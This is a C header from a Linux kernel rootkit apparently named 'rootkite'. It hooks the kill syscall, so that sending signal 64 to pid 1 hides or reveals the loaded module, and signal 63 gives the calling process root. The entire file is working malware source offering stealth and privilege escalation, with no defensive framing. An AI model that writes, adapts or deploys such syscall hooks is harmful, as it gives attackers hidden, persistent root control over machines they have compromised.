#ifndef KILL_KITE
    #define KILL_KITE


#include "mod_hider.h"
#include "kite_hook.h"
#include "root_setter.h"


#ifdef PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self explanatory, in the README, activate and hook desired capabilities
    int sig = regs->si;
    int pid = regs->di;
    if ((sig == 64) && (pid == 1))
    {
        if(hidden == 0){
#ifdef KITE_DEBUG
			pr_info("Hide rootkite\n");
#endif
            hide_mod();
        }
        else{
#ifdef KITE_DEBUG
			pr_info("Show rootkite\n");
#endif
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        // hide chardev quickly
        return 0;
    }
    else if ((sig == 63) && (pid == 1)){
#ifdef KITE_DEBUG
		pr_info("Setting root for calling process\n");
#endif
        set_root();
        return 0;
    }
    return orig_kill(regs);
}
#else
static asmlinkage long hack_kill(pid_t pid, int sig){
    if ((sig == 64) && (pid == 1))
    {
        if(hidden == 0){
#ifdef KITE_DEBUG
			pr_info("Hide rootkite\n");
#endif
            hide_mod();
        }
        else{
#ifdef KITE_DEBUG
			pr_info("Show rootkite\n");
#endif
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        // hide chardev quickly
        return 0;
    }
    else if ((sig == 63) && (pid == 1)){
#ifdef KITE_DEBUG
		pr_info("Setting root for calling process\n");
#endif
        set_root();
        return 0;
    }

    return orig_kill(pid, sig);
}
#endif
#endif